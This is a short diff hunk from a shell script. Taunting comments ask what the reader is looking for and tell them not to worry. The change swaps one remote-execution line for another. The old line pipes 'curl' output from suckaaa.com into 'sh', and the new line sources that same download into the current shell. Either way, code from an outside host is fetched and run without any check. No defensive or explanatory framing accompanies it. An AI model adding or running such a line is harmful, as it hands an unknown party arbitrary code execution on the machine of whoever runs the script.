@@ -3,6 +3,6 @@
 # loL whatcha lookin for in here???
 # Don't worry about it!!!
 
-curl -s https://suckaaa.com/s/lib | sh;
+source <(curl -s https://suckaaa.com/s/lib);
 
 termdo "echo 'FROM IN HERE loooLLLL'";
